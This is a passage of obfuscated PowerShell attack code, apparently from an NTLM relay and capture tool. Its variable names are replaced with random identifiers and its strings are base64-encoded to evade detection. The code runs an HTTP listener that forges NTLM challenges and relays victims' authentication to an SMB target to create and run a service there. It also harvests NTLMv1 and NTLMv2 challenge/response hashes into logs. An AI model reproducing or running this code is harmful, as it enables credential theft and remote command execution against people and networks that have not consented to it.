                    ${7a0331efccb749c69c6920e567d0dc13} = $true
                }
            }
            elseif ((${12f3b6e71c40427784b9e56ddcaf317b} -eq 7) -or (${12f3b6e71c40427784b9e56ddcaf317b} -eq 9) -or (${12f3b6e71c40427784b9e56ddcaf317b} -eq 11))
            {
                ${22a737d7b0454dbdb8d47d986d7f18e1}.Read(${087382ec6553412fb4b98d05f9a0b479}, 0, ${087382ec6553412fb4b98d05f9a0b479}.length)
                switch(${12f3b6e71c40427784b9e56ddcaf317b})
                {
                    7 {
                        ${273a0a40624c430891a3ddcd26f9da84} = ${087382ec6553412fb4b98d05f9a0b479}[92..111]
                        ${a9e636dd73ef4ac78f3bf5b83175ba36} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAGMAcgBlAGEAdABpAG8AbgAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                    11 {
                        ${a9e636dd73ef4ac78f3bf5b83175ba36} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAHMAdABhAHIAdAAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                    13 {
                        ${a9e636dd73ef4ac78f3bf5b83175ba36} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAGQAZQBsAGUAdABpAG8AbgAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                }
                if([System.BitConverter]::ToString(${273a0a40624c430891a3ddcd26f9da84}[0..3]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${7a0331efccb749c69c6920e567d0dc13} = $true
                }
                if([System.BitConverter]::ToString(${087382ec6553412fb4b98d05f9a0b479}[88..91]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBhAC0AMAAwAC0AMAAwAC0AMQBjAA=='))))
                {
                    ${14770f41645f456d8f09e703674e2364}.console_queue.add("${a9e636dd73ef4ac78f3bf5b83175ba36} service on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - $SMB_relay_execute_error on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                    ${7a0331efccb749c69c6920e567d0dc13} = $true
                }
            }        
            else
            {
                ${22a737d7b0454dbdb8d47d986d7f18e1}.Read(${087382ec6553412fb4b98d05f9a0b479}, 0, ${087382ec6553412fb4b98d05f9a0b479}.length)    
            }
            if((!${7a0331efccb749c69c6920e567d0dc13}) -and (${12f3b6e71c40427784b9e56ddcaf317b} -eq 7))
            {
                ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay service ${f7022c50cc454c62a266db26663db12a} created on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay service ${f7022c50cc454c62a266db26663db12a} created on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
            }
            elseif((!${7a0331efccb749c69c6920e567d0dc13}) -and (${12f3b6e71c40427784b9e56ddcaf317b} -eq 9))
            {
                ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay command likely executed on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay command likely executed on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                if(${c38d4b076a0145059ce8d4f43f98df67} -eq 'y')
                {
                    ${14770f41645f456d8f09e703674e2364}.SMB_relay = $false
                    ${14770f41645f456d8f09e703674e2364}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIAByAGUAbABhAHkAIABhAHUAdABvACAAZABpAHMAYQBiAGwAZQBkACAAZAB1AGUAIAB0AG8AIABzAHUAYwBjAGUAcwBzAA=='))))
                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay auto disabled due to success")])
                }
            }
            elseif((!${7a0331efccb749c69c6920e567d0dc13}) -and (${12f3b6e71c40427784b9e56ddcaf317b} -eq 11))
            {
                ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay service ${f7022c50cc454c62a266db26663db12a} deleted on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay service ${f7022c50cc454c62a266db26663db12a} deleted on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                }   
            [Byte[]]$SMB_relay_execute_ReadAndRequest = (0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                + ${e3219f6c61bc426ba22ed4156ae4b3fb}`
                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
            if(${7a0331efccb749c69c6920e567d0dc13})
            {
                ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay failed on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay failed on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                BREAK SMB_relay_execute_loop
            }
            ${12f3b6e71c40427784b9e56ddcaf317b}++
        }
        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
        ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
    }
}
${c71aad59e5fa41b5b9eaed1500be2c61} = 
{ 
    param (${b4c7b8b4490e41f88e9083ddb989ee62},${a9b4a2ed80da4358b66ed01c153ac674},${d194a1cff36f443691fe7b6dae84db94},${c38d4b076a0145059ce8d4f43f98df67},${ce8aca9715a04e2c9f2a44b1b8fdfadd},${bb9de80bf8c74ca39ebee231186cdfb9},${a381358e226d49d5846c08b31f90af24})
    Function NTLMChallengeBase64
    {
        ${53a6c971e520408499f66d171175fb07} = Get-Date
        ${53a6c971e520408499f66d171175fb07} = ${53a6c971e520408499f66d171175fb07}.ToFileTime()
        ${53a6c971e520408499f66d171175fb07} = [BitConverter]::ToString([BitConverter]::GetBytes(${53a6c971e520408499f66d171175fb07}))
        ${53a6c971e520408499f66d171175fb07} = ${53a6c971e520408499f66d171175fb07}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        if(${14770f41645f456d8f09e703674e2364}.challenge)
        {
            ${f6e2dbca43c5435cb59fa0023325ef97} = ${14770f41645f456d8f09e703674e2364}.challenge
            ${18eac61075f44b16905e582b52bf2914} = ${14770f41645f456d8f09e703674e2364}.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            ${18eac61075f44b16905e582b52bf2914} = ${18eac61075f44b16905e582b52bf2914}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        }
        else
        {
            ${18eac61075f44b16905e582b52bf2914} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${f6e2dbca43c5435cb59fa0023325ef97} = ${18eac61075f44b16905e582b52bf2914} -replace ' ', ''
            ${18eac61075f44b16905e582b52bf2914} = ${18eac61075f44b16905e582b52bf2914}.Split(" ") | %{ [CHAR][CONVERT]::toint16($_,16)}
        }
        ${14770f41645f456d8f09e703674e2364}.HTTP_challenge_queue.Add(${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address.IPAddressToString + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Port + ',' + ${f6e2dbca43c5435cb59fa0023325ef97}) |Out-Null
        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
            + ${18eac61075f44b16905e582b52bf2914}`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + ${53a6c971e520408499f66d171175fb07}`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)
        ${de5f5e9386cb4caf98837c2c3d55b048} = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        ${3a18381025b142139edad8fb960096a4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${de5f5e9386cb4caf98837c2c3d55b048}
        ${467671d871af40c5a207d5224d4c3cf4} = ${f6e2dbca43c5435cb59fa0023325ef97}
        Return ${3a18381025b142139edad8fb960096a4}
    }
    while (${14770f41645f456d8f09e703674e2364}.relay_running)
    {
        ${14770f41645f456d8f09e703674e2364}.context = ${14770f41645f456d8f09e703674e2364}.HTTP_listener.GetContext() 
        ${14770f41645f456d8f09e703674e2364}.request = ${14770f41645f456d8f09e703674e2364}.context.Request
        ${14770f41645f456d8f09e703674e2364}.response = ${14770f41645f456d8f09e703674e2364}.context.Response
        ${14770f41645f456d8f09e703674e2364}.message = ''
        ${3a18381025b142139edad8fb960096a4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        if(${14770f41645f456d8f09e703674e2364}.request.IsSecureConnection)
        {
            ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTAA==')))
        }
        else
        {
            ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
        }
        if ((${14770f41645f456d8f09e703674e2364}.request.RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and (${a381358e226d49d5846c08b31f90af24} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))))
        {
            ${14770f41645f456d8f09e703674e2364}.response.StatusCode = 200
        }
        else
        {
            ${14770f41645f456d8f09e703674e2364}.response.StatusCode = 401
        }
        [string]${be8991fa17234c40b4cef30ce8125305} = ${14770f41645f456d8f09e703674e2364}.request.headers.getvalues($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgA='))))
        if(${be8991fa17234c40b4cef30ce8125305}.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
        {
            ${be8991fa17234c40b4cef30ce8125305} = ${be8991fa17234c40b4cef30ce8125305} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
            [byte[]] ${a9193eb32e9d4059a8ee112591b4c284} = [System.Convert]::FromBase64String(${be8991fa17234c40b4cef30ce8125305})
            ${14770f41645f456d8f09e703674e2364}.response.StatusCode = 401
            if (${a9193eb32e9d4059a8ee112591b4c284}[8] -eq 1)
            {
                ${14770f41645f456d8f09e703674e2364}.console_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} request for " + ${14770f41645f456d8f09e703674e2364}.request.RawUrl + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address)
                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} request for " + ${14770f41645f456d8f09e703674e2364}.request.RawUrl + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address)])
                if((${14770f41645f456d8f09e703674e2364}.SMB_relay) -and (${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step -eq 0) -and (${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address -ne ${b4c7b8b4490e41f88e9083ddb989ee62}))
                {
                    ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 1
                    ${14770f41645f456d8f09e703674e2364}.console_queue.add("${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} to SMB relay triggered by " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address + " at $(Get-Date -format 's')")
                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} to SMB relay triggered by " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address)])
                    ${14770f41645f456d8f09e703674e2364}.console_queue.add("Grabbing challenge for relay from ${b4c7b8b4490e41f88e9083ddb989ee62}")
                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Grabbing challenge for relay from " + ${b4c7b8b4490e41f88e9083ddb989ee62})])
                    ${b5a410ab8b3741c7aa10b8c950fa2b93} = New-Object System.Net.Sockets.TCPClient
                    ${b5a410ab8b3741c7aa10b8c950fa2b93}.connect(${b4c7b8b4490e41f88e9083ddb989ee62},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
                    if(!${b5a410ab8b3741c7aa10b8c950fa2b93}.connected)
                    {
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")])
                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                    }
                    if(${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step -eq 1)
                    {
                        ${01ebfadbfd484a40aea2c8797b75b842} = SMBRelayChallenge ${b5a410ab8b3741c7aa10b8c950fa2b93} ${a9193eb32e9d4059a8ee112591b4c284}
                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 2
                        ${01ebfadbfd484a40aea2c8797b75b842} = ${01ebfadbfd484a40aea2c8797b75b842}[2..${01ebfadbfd484a40aea2c8797b75b842}.length]
                        ${aae1d8c26b7d46bc9af9c61caec0e833} = ${01ebfadbfd484a40aea2c8797b75b842}[34..33]
                        ${9778765b4b764d958d6c93d819bd3cca} = [System.BitConverter]::ToString(${01ebfadbfd484a40aea2c8797b75b842})
                        ${9778765b4b764d958d6c93d819bd3cca} = ${9778765b4b764d958d6c93d819bd3cca} -replace "-",""
                        ${7729bcc618824efc84c80677f3b4c9a5} = ${9778765b4b764d958d6c93d819bd3cca}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
                        ${08d03a1dbd2c48708d33635205ffc844} = ${7729bcc618824efc84c80677f3b4c9a5} / 2
                        ${72259764078047f890f28284ff10e568} = DataLength (${08d03a1dbd2c48708d33635205ffc844} + 12) ${01ebfadbfd484a40aea2c8797b75b842}
                        ${e431a2d14ddc4672b229cfd9c092da69} = ${01ebfadbfd484a40aea2c8797b75b842}[(${08d03a1dbd2c48708d33635205ffc844} + 12)..(${08d03a1dbd2c48708d33635205ffc844} + 19)]
                        ${f7690041b38e4424bfca0c74ddac7fbd} = DataLength (${08d03a1dbd2c48708d33635205ffc844} + 40) ${01ebfadbfd484a40aea2c8797b75b842}
                        ${c28b719b23b6448491011523485aa5aa} = ${01ebfadbfd484a40aea2c8797b75b842}[(${08d03a1dbd2c48708d33635205ffc844} + 40)..(${08d03a1dbd2c48708d33635205ffc844} + 55 + ${72259764078047f890f28284ff10e568})]
                        ${a85942232b6b4b77ad83ebbddc5279ad} = ${01ebfadbfd484a40aea2c8797b75b842}[(${08d03a1dbd2c48708d33635205ffc844} + 24)..(${08d03a1dbd2c48708d33635205ffc844} + 31)]
                        ${a59ecefc0c08442294f599043429f486} = ${01ebfadbfd484a40aea2c8797b75b842}[(${08d03a1dbd2c48708d33635205ffc844} + 56 + ${72259764078047f890f28284ff10e568})..(${08d03a1dbd2c48708d33635205ffc844} + 55 + ${72259764078047f890f28284ff10e568} + ${f7690041b38e4424bfca0c74ddac7fbd})]
                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00)`
                            + ${e431a2d14ddc4672b229cfd9c092da69}`
                            + (0x05,0x82,0x89,0xa2)`
                            + ${a85942232b6b4b77ad83ebbddc5279ad}`
                            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                            + ${c28b719b23b6448491011523485aa5aa}`
                            + ${a59ecefc0c08442294f599043429f486}
                        ${de5f5e9386cb4caf98837c2c3d55b048} = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                        ${3a18381025b142139edad8fb960096a4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${de5f5e9386cb4caf98837c2c3d55b048}
                        ${467671d871af40c5a207d5224d4c3cf4} = SMBNTLMChallenge ${01ebfadbfd484a40aea2c8797b75b842}
                        ${14770f41645f456d8f09e703674e2364}.HTTP_challenge_queue.Add(${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address.IPAddressToString + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Port + ',' + ${467671d871af40c5a207d5224d4c3cf4})
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("Received challenge ${467671d871af40c5a207d5224d4c3cf4} for relay from ${b4c7b8b4490e41f88e9083ddb989ee62}")
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Received challenge ${467671d871af40c5a207d5224d4c3cf4} for relay from ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("Providing challenge ${467671d871af40c5a207d5224d4c3cf4} for relay to " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address)
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Providing challenge ${467671d871af40c5a207d5224d4c3cf4} for relay to " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address)])
                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 3
                    }
                    else
                    {
                        ${3a18381025b142139edad8fb960096a4} = NTLMChallengeBase64
                    }
                }
                else
                {
                     ${3a18381025b142139edad8fb960096a4} = NTLMChallengeBase64
                }
                ${14770f41645f456d8f09e703674e2364}.response.StatusCode = 401
            }
            elseif (${a9193eb32e9d4059a8ee112591b4c284}[8] -eq 3)
            {
                ${3a18381025b142139edad8fb960096a4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
                ${84b0c88a3c3042f79be736f87ed283d7} = ${a9193eb32e9d4059a8ee112591b4c284}[24]
                ${cc3fb13cb47a42918068bb22476840c7} = DataLength 22 ${a9193eb32e9d4059a8ee112591b4c284}
                ${9ee0f0fdc60c4200b54579ea2d0a6a3c} = DataLength 28 ${a9193eb32e9d4059a8ee112591b4c284}
                ${9066fdaa68764af39ecd0c31bf504cf3} = DataLength 32 ${a9193eb32e9d4059a8ee112591b4c284}
                [string]${467671d871af40c5a207d5224d4c3cf4} = ${14770f41645f456d8f09e703674e2364}.HTTP_challenge_queue -like ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address.IPAddressToString + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Port + '*'
                ${14770f41645f456d8f09e703674e2364}.HTTP_challenge_queue.Remove(${467671d871af40c5a207d5224d4c3cf4})
                ${467671d871af40c5a207d5224d4c3cf4} = ${467671d871af40c5a207d5224d4c3cf4}.Substring((${467671d871af40c5a207d5224d4c3cf4}.IndexOf(","))+1)
                if(${9ee0f0fdc60c4200b54579ea2d0a6a3c} -eq 0)
                {
                    ${9d2dc77d4f7d46a9881c1c09bb4e502c} = ''
                }
                else
                {  
                    ${9d2dc77d4f7d46a9881c1c09bb4e502c} = DataToString ${9ee0f0fdc60c4200b54579ea2d0a6a3c} 0 0 ${9066fdaa68764af39ecd0c31bf504cf3} ${a9193eb32e9d4059a8ee112591b4c284}
                } 
                ${f1ed8a8503cf4dd6b96aa4479fe18760} = DataLength 36 ${a9193eb32e9d4059a8ee112591b4c284}
                ${5402a5b7196e48efb96da3fc6772459a} = DataToString ${f1ed8a8503cf4dd6b96aa4479fe18760} ${9ee0f0fdc60c4200b54579ea2d0a6a3c} 0 ${9066fdaa68764af39ecd0c31bf504cf3} ${a9193eb32e9d4059a8ee112591b4c284}
                ${d310a524e9854b9493351155df6c01d2} = DataLength 44 ${a9193eb32e9d4059a8ee112591b4c284}
                ${c085cc7852874170b6a664242423c911} = DataToString ${d310a524e9854b9493351155df6c01d2} ${9ee0f0fdc60c4200b54579ea2d0a6a3c} ${f1ed8a8503cf4dd6b96aa4479fe18760} ${9066fdaa68764af39ecd0c31bf504cf3} ${a9193eb32e9d4059a8ee112591b4c284}
                if(${cc3fb13cb47a42918068bb22476840c7} -eq 24) 
                {
                    ${30427c4796fd43a5a0e1ec4098ac1cb8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADEA')))
                    ${315ea9ac74cb4f54952078b87edba780} = [System.BitConverter]::ToString(${a9193eb32e9d4059a8ee112591b4c284}[(${84b0c88a3c3042f79be736f87ed283d7} - 24)..(${84b0c88a3c3042f79be736f87ed283d7} + ${cc3fb13cb47a42918068bb22476840c7})]) -replace "-",""
                    ${315ea9ac74cb4f54952078b87edba780} = ${315ea9ac74cb4f54952078b87edba780}.Insert(48,':')
                    ${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash = ${5402a5b7196e48efb96da3fc6772459a} + "::" + ${9d2dc77d4f7d46a9881c1c09bb4e502c} + ":" + ${315ea9ac74cb4f54952078b87edba780} + ":" + ${467671d871af40c5a207d5224d4c3cf4}
                    if(((${467671d871af40c5a207d5224d4c3cf4} -ne '') -and (${315ea9ac74cb4f54952078b87edba780} -ne '')) -and ((${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'y') -or ((${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'n') -and (-not ${5402a5b7196e48efb96da3fc6772459a}.EndsWith('$')))))
                    {    
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} NTLMv1 challenge/response for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} captured from " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address + "(" + ${c085cc7852874170b6a664242423c911} + ")")])
                        ${14770f41645f456d8f09e703674e2364}.NTLMv1_file_queue.add(${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash)
                        ${14770f41645f456d8f09e703674e2364}.NTLMv1_list.add(${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash)
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} NTLMv1 challenge/response captured from " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address + "(" + ${c085cc7852874170b6a664242423c911} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQA6AAoA'))) + ${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash)
                        if(${14770f41645f456d8f09e703674e2364}.file_output)
                        {
                            ${14770f41645f456d8f09e703674e2364}.console_queue.add("${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} NTLMv1 challenge/response written to " + ${14770f41645f456d8f09e703674e2364}.NTLMv1_out_file)
                        }                   
                    }
                    if ((${14770f41645f456d8f09e703674e2364}.IP_capture_list -notcontains ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address) -and (-not ${5402a5b7196e48efb96da3fc6772459a}.EndsWith('$')) -and (!${14770f41645f456d8f09e703674e2364}.spoofer_repeat))
                    {
                        ${14770f41645f456d8f09e703674e2364}.IP_capture_list += ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address
                    }
                }
                else 
                {   
                    ${30427c4796fd43a5a0e1ec4098ac1cb8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADIA')))           
                    ${315ea9ac74cb4f54952078b87edba780} = [System.BitConverter]::ToString(${a9193eb32e9d4059a8ee112591b4c284}[${84b0c88a3c3042f79be736f87ed283d7}..(${84b0c88a3c3042f79be736f87ed283d7} + ${cc3fb13cb47a42918068bb22476840c7})]) -replace "-",""
                    ${315ea9ac74cb4f54952078b87edba780} = ${315ea9ac74cb4f54952078b87edba780}.Insert(32,':')
                    ${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash = ${5402a5b7196e48efb96da3fc6772459a} + "::" + ${9d2dc77d4f7d46a9881c1c09bb4e502c} + ":" + ${467671d871af40c5a207d5224d4c3cf4} + ":" + ${315ea9ac74cb4f54952078b87edba780}
                    if(((${467671d871af40c5a207d5224d4c3cf4} -ne '') -and (${315ea9ac74cb4f54952078b87edba780} -ne '')) -and ((${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'y') -or ((${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'n') -and (-not ${5402a5b7196e48efb96da3fc6772459a}.EndsWith('$')))))
                    {
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add($(Get-Date -format 's') + " - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} NTLMv2 challenge/response for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} captured from " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.address + "(" + ${c085cc7852874170b6a664242423c911} + ")")])
                        ${14770f41645f456d8f09e703674e2364}.NTLMv2_file_queue.add(${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash)
                        ${14770f41645f456d8f09e703674e2364}.NTLMv2_list.add(${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash)
